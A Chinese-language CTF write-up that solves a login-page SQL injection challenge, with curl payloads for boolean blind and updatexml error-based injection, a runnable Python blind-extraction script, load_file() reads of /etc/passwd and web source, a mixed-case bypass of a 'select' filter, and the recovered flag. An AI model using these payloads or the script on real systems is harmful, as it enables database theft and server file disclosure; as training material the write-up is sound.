---
title: 7-SQL注入-2
date: 2026-07-09
categories:
  - CTF
  - WEB
tags:
  - SQL注入
  - 报错注入
  - updatexml
  - 关键字绕过
---

# 1. 题目分析

- **目标 URL**：`http://xxx.http-ctf2.dasctf.com/login.php`
- **页面类型**：登录页面（N1 后台管理系统），通过 AJAX POST 提交登录
- **技术栈**：OpenResty (Nginx) + PHP/5.5.9-1ubuntu4.29 + MariaDB

## 初始探测

访问 `/` 直接返回 403，但 `/login.php` 存在：

```bash
curl -s -i "TARGET/"
# → 403 Forbidden

curl -s -i "TARGET/login.php"
# → 200 OK，登录表单页面
```

HTTP 响应头关键信息：

| 响应头 | 值 | 含义 |
|--------|-----|------|
| `Server` | `openresty` | Nginx 系 Web 中间件 |
| `X-Powered-By` | `PHP/5.5.9-1ubuntu4.29` | 后端 PHP 5.5.9（Ubuntu 14.04） |

# 2. 信息收集

## 2.1 页面分析

访问 `/login.php`，页面显示「登录N1后台管理系统」的表单，有两个输入框：
- `id="login_name"` → 账户
- `id="login_password"` → 密码

HTML 注释中有关键提示：

```html
<!-- 如果觉得太难了，可以在url后加入?tips=1 开启mysql错误提示,使用burp发包就可以看到啦-->
```

## 2.2 分析前端 JS

`/js/index.js` 揭示了 AJAX 提交细节：

```javascript
function login(name, password_) {
    $.ajax({
        url: URL,
        type: "POST",
        dataType: "json",
        data: {
            name: name,      // ← 参数名为 name
            pass: password_  // ← 参数名为 pass
        },
        success: function(data) {
            if(data.error == '0'){
                window.location.href = 'user.php'; // 登录成功跳转
            }
        }
    })
}
```

**关键发现**：
- POST 参数名是 `name` 和 `pass`（不是 `login_name`/`login_password`）
- 登录成功 (`error: 0`) 会跳转到 `user.php`

## 2.3 确定注入点

```bash
# 正常登录 → 账号或密码错误
curl -s -X POST -d "name=admin&pass=admin" "TARGET/login.php"
# → {"error":1,"msg":"账号或密码错误"}

# 添加单引号（不加 tips） → 只能看到 JSON 提示，无 SQL 报错
curl -s -X POST -d "name=admin'&pass=admin" "TARGET/login.php"
# → {"error":1,"msg":"账号不存在"}

# 添加单引号 + tips=1 → 原始 SQL 报错出现在 JSON 前面！
curl -s -X POST -d "name=admin'&pass=admin" "TARGET/login.php?tips=1"
# → You have an error in your SQL syntax; check the manual that
#   corresponds to your MariaDB server version for the right syntax
#   to use near ''admin''' at line 1
# → {"error":1,"msg":"账号不存在"}
```

**关键区别**：
- 不加 `?tips=1`：PHP 只返回 JSON，错误信息被吞掉，只能看到 `账号不存在`
- 加 `?tips=1`：PHP 在 JSON 前面**直接 echo 了 MySQL 原始报错**（不是 JSON 格式），这就是 2.1 节 HTML 注释提示的作用

确认 `name` 参数存在 SQL 注入，且为**单引号字符型**。

## 2.4 确认布尔盲注基底

> **在进入报错注入之前，先用布尔盲注确认注入点的可控性。**

### Payload 拆解

后端 SQL 模板推测为：

```sql
SELECT * FROM users WHERE name='[输入]' AND pass='[输入]'
```

POST 数据 `name=admin' and 1=1 and '1'='1&pass=x` 代入后：

```
			     ┌── 原始开引号         原始闭引号 ──┐
                 │                                │
WHERE name='admin' and 1=1 and '1'='1' AND pass='x'
           ─┬─            ─┬─       ─┬─            ─┬─
            │              │         │              └── pass 填任意值
            │              │         └── 我们补的引号，和原始闭引号拼成 '1'='1'（恒真）
            │              └── 注入的布尔条件
            └── admin 闭合第一个字符串
```

关键技巧 **`'1'='1`** 是用来「消耗」原始 SQL 中 `name='...'` 那个**结尾单引号**的：

- 我们的输入以 `'1` 开头 → 这个 `'` 配合原始模板的 `'`（绿色那个），形成字符串 `'1'`
- `='1` → 等于字符串 `'1'`
- 末尾我们**没有**闭合最后一个 `'`，留给原始模板的闭引号来闭合

最终 `'1'='1'`（三个 `'` 中最后一个来自模板），意思是 `'1' = '1'`，恒真。

**`&pass=x`** 只是给 `pass` 参数填一个任意值（`x`），因为后端同时校验两个参数都不能为空。

### 验证 TRUE/FALSE

```bash
# TRUE 条件（1=1 成立 + 引号闭合正确 → 查到 admin 用户）
curl -s -X POST -d "name=admin' and 1=1 and '1'='1&pass=x" "TARGET/login.php"
# → {"error":1,"msg":"账号或密码错误"}  ← 用户存在，只是密码不对

# FALSE 条件（1=2 不成立 → 查不到任何用户）
curl -s -X POST -d "name=admin' and 1=2 and '1'='1&pass=x" "TARGET/login.php"
# → {"error":1,"msg":"账号不存在"}      ← SQL 返回空结果集
```

两种响应状态：
- **TRUE**：`msg="账号或密码错误"` → SQL 条件成立，查到了用户行
- **FALSE**：`msg="账号不存在"` → SQL 条件不成立，空结果集

## 2.5 通过 load_file() 探测环境

确认布尔盲注可用后，在探索 SQL 函数权限时，顺手测试了 `load_file()` 文件读取函数：

```bash
# 测试 load_file 是否可用（读 /etc/passwd 验证）
curl -s -X POST \
  -d "name=admin' and length(load_file('/etc/passwd'))>0 and '1'='1&pass=x" \
  "TARGET/login.php"
# → {"error":1,"msg":"账号或密码错误"}  ← TRUE！说明文件存在且可读

# 读取登录成功后的跳转页面 user.php
curl -s -X POST \
  -d "name=admin' and length(load_file('/var/www/html/user.php'))>0 and '1'='1&pass=x" \
  "TARGET/login.php"
# → {"error":1,"msg":"账号或密码错误"}  ← 文件存在！
```

然后用布尔盲注逐字符读出 `user.php` 源码。方法如下：

### 逐字符提取原理（二分查找）

每一轮发送一个 TRUE/FALSE 判断：

```
admin' and ascii(substr(load_file('/var/www/html/user.php'), N, 1)) > M and '1'='1
         ─┬─  ─────────────────────────────────────────── ─┬── ─┬─
          │                                                │    │
          │         取文件第 N 个字符的 ASCII 值              │    比较
          │                                                │
          └── 2.4 节的布尔盲注模板                            └── 二分中点
```

- **TRUE** (账号或密码错误) → 字符的 ASCII 码 **> M**，上移搜索下界
- **FALSE** (账号不存在) → 字符的 ASCII 码 **≤ M**，下移搜索上界

用二分查找，每个字符约 7 次请求就能收敛到精确值。比如要提取第一个字符 `'<'` (ASCII 60)：

```
M=64: ascii('<') > 64?  60 > 64 → FALSE → high=63
M=32: ascii('<') > 32?  60 > 32 → TRUE  → low=33
M=48: ascii('<') > 48?  60 > 48 → TRUE  → low=49
M=56: ascii('<') > 56?  60 > 56 → TRUE  → low=57
M=60: ascii('<') > 60?  60 > 60 → FALSE → high=59
M=58: ascii('<') > 58?  60 > 58 → TRUE  → low=59
M=59: ascii('<') > 59?  60 > 59 → TRUE  → low=60
→ 收敛到 60，查 ASCII 表得到 '<'
```

### 自动化脚本

整个提取过程用 Python 脚本自动化，可直接执行：

```python
#!/usr/bin/env python3
"""布尔盲注逐字符提取脚本 — 从 load_file() 读取文件内容"""
import requests
import sys

TARGET = "http://6104ac91f00692661c75bbe3.http-ctf2.dasctf.com/login.php"

def check(payload: str) -> bool:
    """
    发送布尔盲注 payload，返回 TRUE/FALSE。

    TRUE  → "账号或密码错误" → SQL 条件成立，查到了用户行
    FALSE → "账号不存在"     → SQL 条件不成立，空结果集
    """
    resp = requests.post(TARGET, data={"name": payload, "pass": "x"})
    try:
        msg = resp.json().get("msg", "")
        return "错误" in msg          # "账号或密码错误" 包含 "错误"
    except Exception:
        return False

def extract_value(query_expr: str, max_len: int = 500) -> str:
    """
    用二分查找逐字符提取 SQL 子查询的结果字符串。

    query_expr: SQL 表达式，返回值必须是字符串
               如 "load_file('/var/www/html/user.php')"
    max_len:   最大提取长度（防止死循环）
    """
    result = ""
    print(f"[*] Extracting...", end="", flush=True)

    for pos in range(1, max_len + 1):
        # ── 二分查找当前字符的 ASCII 码 ──
        low, high = 1, 127
        while low <= high:
            mid = (low + high) // 2
            # ascii(substr(..., pos, 1)) > mid ?
            payload = (
                f"admin' and ascii(substr({query_expr},{pos},1))>{mid}"
                f" and '1'='1"
            )
            if check(payload):          # TRUE → 字符 ASCII 码 > mid
                low = mid + 1
            else:                        # FALSE → 字符 ASCII 码 ≤ mid
                high = mid - 1

        # ── 验证：精确匹配确认该位置确实有字符 ──
        verify = (
            f"admin' and ascii(substr({query_expr},{pos},1))={low}"
            f" and '1'='1"
        )
        if check(verify):
            ch = chr(low)
            result += ch
            # 终端友好输出：控制字符转义显示
            if low == 10:        # 换行
                sys.stdout.write("\\n\n")
            elif low == 13:      # 回车
                sys.stdout.write("\\r")
            elif low == 9:       # 制表符
                sys.stdout.write("\\t")
            elif low < 32:       # 其他不可见字符
                sys.stdout.write(f"[{low}]")
            else:
                sys.stdout.write(ch)
            sys.stdout.flush()
        else:
            break                 # 连续匹配失败 → 文件结束

    print()
    return result


if __name__ == "__main__":
    # 读取 login.php 的源码
    content = extract_value("load_file('/var/www/html/user.php')")
    print(f"\n[+] 提取结果 ({len(content)} 字符):")
    print(content)
```

**脚本核心逻辑**：

```
对于文件的每个位置 N（从 1 开始）：
  1. 二分查找确定第 N 个字符的 ASCII 码
  2. 用精确相等验证该字符确实存在
  3. 验证失败 → 文件已读完，退出循环
  4. 每个字符约 7 次 HTTP 请求
```

### 提取结果

```php
<?php
session_start();
if(empty($_SESSION['name'])){
    echo "login first";
}else{
    echo "flag is in the database!";  // ← 关键信息
}
```

**结论**：flag 存储在数据库中，必须通过 SQL 注入提取，不能靠读文件拿 flag。

> `load_file()` 能读文件是因为 MySQL 用户可能有 `FILE` 权限，且 `secure_file_priv` 为空或未限制。这是信息收集阶段的意外收获。

# 3. 漏洞分析

## 3.1 推理链

```
线索 1：login.php 有 name/pass 登录表单
  ↓
线索 2：HTML 注释提示 ?tips=1 可开启 SQL 错误显示
  ↓
线索 3：admin' 触发 SQL 语法错误 → 确认注入点
  ↓
线索 4：布尔盲注 TRUE/FALSE 状态可控 → 确认可逐字符提取数据
  ↓
线索 5：load_file() 函数可用 → 读取 user.php
  ↓ → 源码显示 "flag is in the database!"
确认 flag 在数据库中 → 必须用 SQL 提取（不能靠读文件）
  ↓
线索 6：sELECT 大小写混合可以绕过关键字过滤！
```

## 3.2 关键字绕过

本题在 PHP 端设置了关键字黑名单过滤 `select`（大小写不敏感）：

| 查询内容 | 使用的关键字 | 结果 |
|---------|------------|------|
| `select group_concat(table_name) from ...` | 全小写 `select` | ❌ SQL 语法错误 |
| `sELECT group_concat(table_name) from ...` | 混合大小写 `sELECT` | ✅ XPATH 错误回显数据 |

**绕过方法**：大小写混合，如 `sELECT`、`SeLeCt` 等。

## 3.3 注释符测试

| 注释符 | URL 编码 | 结果 |
|--------|---------|------|
| `--+` | `--+` | ❌ 不生效 |
| `-- ` (尾部空格) | `--%20` | ✅ 可用 |
| `#` | `%23` | ✅ 可用 |

## 3.4 选择报错注入

布尔盲注速度太慢（每字符 8 次请求），且 `load_file` 已经确认 flag 在数据库。利用 `tips=1` 的 MySQL 错误回显功能，使用 `updatexml()` 函数进行报错注入，一次请求即可获取数据。

### updatexml 报错注入原理

```sql
updatexml(XML_target, XPath_expr, new_XML)
```

`updatexml()` 的第二个参数 `XPath_expr` 必须是一个**合法的 XPath 表达式**。如果传入非法 XPath，MySQL 会抛出错误，并把非法内容原样输出在报错信息中。我们正是利用这个报错来回显数据。

### concat(0x7e, (子查询)) 的作用

`0x7e` 是 ASCII 字符 **`~`**（波浪号）的十六进制写法：

```
concat(0x7e, (sELECT database()))
     → concat('~', 'note')
     → '~note'
```

**为什么必须加 `~`？**

`~` 是一个**必定非法**的 XPath 字符。如果不加 `~`，子查询结果可能碰巧是合法 XPath（比如纯数字 `1`），MySQL 就不会报错，数据拿不到：

| 传入 updatexml 的 XPath | 是否报错 | 回显内容 |
|-------------------------|---------|---------|
| `concat('~', 'note')` → `~note` | ✅ 报错（`~` 非法） | `XPATH syntax error: '~note'` |
| 不加 `~`，直接 `'note'` | ✅ 报错（字符串非法） | `XPATH syntax error: 'note'` |
| 不加 `~`，只传数字 `1` | ❌ 不报错！（`1` 是合法 XPath） | 什么都拿不到 |

`~` 就是一个**保险**——保证无论子查询返回什么，都会触发 XPATH 报错。

### 从报错中提取数据

```
原始响应：string(33) "XPATH syntax error: '~fl4g,users'"

用正则匹配 ~ 后面的内容：
  /XPATH syntax error: '~([^']*)'/
                              ↑ 捕获 ~ 之后、下一个 ' 之前的内容
→ 提取结果：fl4g,users
```

## 3.5 完整 SQL 查询推演

```
后端 SQL 推测：
┌──────────────────────────────────────────────────────────┐
│ SELECT * FROM users WHERE name='$name' AND pass='$pass'   │
└──────────────────────────────────────────────────────────┘

我们的注入：
name = 1' and updatexml(1,concat(0x7e,(sELECT database())),1)#

最终执行的 SQL：
┌──────────────────────────────────────────────────────────┐
│ SELECT * FROM users                                      │
│ WHERE name='1'                                           │
│   and updatexml(1,concat(0x7e,(sELECT database())),1)#   │
│   AND pass='1'  ← 被 # 注释掉                             │
└──────────────────────────────────────────────────────────┘
```

关键点：
- 注入在 `name` 参数，`pass` 参数填任意值
- `#` 注释掉后面的 `AND pass='...'` 部分
- `updatexml()` 产生 XPATH 错误，回显子查询结果

# 4. 漏洞利用

## 4.1 获取数据库信息

```bash
# 数据库名
curl -s "TARGET/login.php?tips=1" \
  --data-urlencode "name=1' and updatexml(1,concat(0x7e,(sELECT database())),1)#" \
  -d "pass=1"
# → XPATH syntax error: '~note'        → 数据库名：note

# 版本信息
curl -s "TARGET/login.php?tips=1" \
  --data-urlencode "name=1' and updatexml(1,concat(0x7e,(sELECT version())),1)#" \
  -d "pass=1"
# → XPATH syntax error: '~5.5.64-MariaDB-1ubuntu0.14.04.1'
```

- 数据库名：`note`（与 SQL 注入-1 相同）
- 版本：MariaDB 5.5.64

## 4.2 获取表名

```bash
curl -s "TARGET/login.php?tips=1" \
  --data-urlencode "name=1' and updatexml(1,concat(0x7e,(sELECT group_concat(table_name) from information_schema.tables where table_schema=database())),1)#" \
  -d "pass=1"
# → XPATH syntax error: '~fl4g,users'
```

表名：`fl4g`、`users`

## 4.3 获取列名

```bash
curl -s "TARGET/login.php?tips=1" \
  --data-urlencode "name=1' and updatexml(1,concat(0x7e,(sELECT group_concat(column_name) from information_schema.columns where table_schema=database())),1)#" \
  -d "pass=1"
# → XPATH syntax error: '~flag,id,username,passwd'
```

`fl4g` 和 `users` 的列（合在一起）：`flag`（显然在 fl4g 表）、`id`、`username`、`passwd`

## 4.4 获取 Flag

```bash
curl -s "TARGET/login.php?tips=1" \
  --data-urlencode "name=1' and updatexml(1,concat(0x7e,(sELECT * from fl4g limit 1)),1)#" \
  -d "pass=1"
# → XPATH syntax error: '~n1book{login_sqli_is_nice}'
```

## 4.5 数据库结构总结

```
数据库: note
├── users (id, username, passwd)   — 用户表
└── fl4g (flag, ...)               — flag 存储表
```

# 5. Flag

```
n1book{login_sqli_is_nice}
```

# 6. 知识点总结

## 6.1 技术要点

| 技术点 | 说明 |
|--------|------|
| **报错注入 (updatexml)** | 利用 `updatexml()` 函数的 XPath 错误回显数据，一次请求出结果，比布尔盲注高效得多 |
| **关键字过滤绕过** | `select` 被过滤（大小写不敏感），使用 `sELECT` 混合大小写绕过 |
| **注释符** | `#` 和 `-- `（尾部空格）都可用，`--+` 在这个环境不生效 |
| **AJAX 参数发现** | 通过分析 JS 源码确认 POST 参数名为 `name` 和 `pass`（而非 HTML 中的 `login_name`/`login_password`） |
| **调试参数** | `tips=1` 参数开启 MySQL 错误回显，是报错注入的前提 |

## 6.2 与 SQL 注入-1 的对比

| 维度 | SQL 注入-1 | SQL 注入-2 |
|------|-----------|-----------|
| 注入类型 | UNION SELECT | 报错注入 (updatexml) |
| 注入点 | GET 参数 `id` | POST 参数 `name` |
| 调试参数 | `tips=1` 显示完整 SQL | `tips=1` 显示 MySQL 错误 |
| 关键字过滤 | 无 | `select` 关键词过滤 |
| 绕过方法 | 无需绕过 | `sELECT` 大小写混合 |
| 注释符 | `--+` | `#` |
| 数据库 | `note` | `note`（相同） |
| 效率 | 一次出结果 | 一次出结果 |

## 6.3 防御建议

- 使用参数化查询（Prepared Statements）
- 不要在生产环境保留调试参数（`tips=1`）
- 关键字黑名单不可靠，白名单更安全但参数化查询才是根本解决方案
- 对数据库错误信息进行统一处理，不暴露给前端

# 7. 解题链路总结图

```
访问 / → 403 Forbidden
    ↓
枚举路径 → /login.php 200
    ↓
分析 HTML → 提示 ?tips=1 开启错误回显
    ↓
分析 JS → name/pass 为 POST 参数
    ↓
admin' → SQL 语法错误 → 确认注入点
    ↓
load_file('user.php') → "flag is in the database!"
    ↓ → 确认 flag 在数据库中，需要 SQL 提取
测试 updatexml 报错注入
    ↓
发现 select 关键字被过滤
    ↓
使用 sELECT 大小写绕过 ✅
    ↓
updatexml(1,concat(0x7e,(sELECT database())),1)#
    ↓ → database: note
updatexml(1,concat(0x7e,(sELECT group_concat(table_name) from information_schema.tables where table_schema=database())),1)#
    ↓ → tables: fl4g, users
updatexml(1,concat(0x7e,(sELECT group_concat(column_name) from information_schema.columns where table_schema=database())),1)#
    ↓ → columns: flag, id, username, passwd
updatexml(1,concat(0x7e,(sELECT * from fl4g limit 1)),1)#
    ↓ → n1book{login_sqli_is_nice} 🎉
```

# 8. 失败路径记录

| 尝试 | 预期 | 实际结果 | 排除的漏洞 |
|------|------|---------|-----------|
| Nginx alias 路径穿越 | 绕过 403 | 全部 404 | Nginx 无 alias 配置漏洞 |
| 布尔盲注脚本逐字提取 | 自动化大量请求 | FROM 关键字的请求全部 SQL 语法错误 | 以为是 FROM 过滤 |
| `--+` 注释 | 注释后续 SQL | 不生效（返回「账号不存在」） | 改用 `#` 或 `-- ` |
| `load_file('/flag')` | 直接读取 flag 文件 | 文件不存在 | flag 在数据库中 |
| 全小写 `select ... from ...` | 正常执行 | SQL 语法错误 | **发现 `select` 关键字过滤** |
| 双写绕过 `seselectlect` | 绕过过滤 | 失败 | 不是 `str_replace` 过滤 |
